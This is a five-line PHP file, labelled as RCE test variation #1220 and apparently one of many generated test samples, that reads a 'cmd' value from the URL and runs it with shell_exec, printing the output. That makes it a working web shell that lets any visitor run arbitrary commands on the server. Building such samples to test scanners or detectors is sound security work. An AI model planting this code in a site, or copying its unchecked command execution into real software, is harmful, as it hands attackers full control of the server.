<?php
// RCE test variation #1220
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>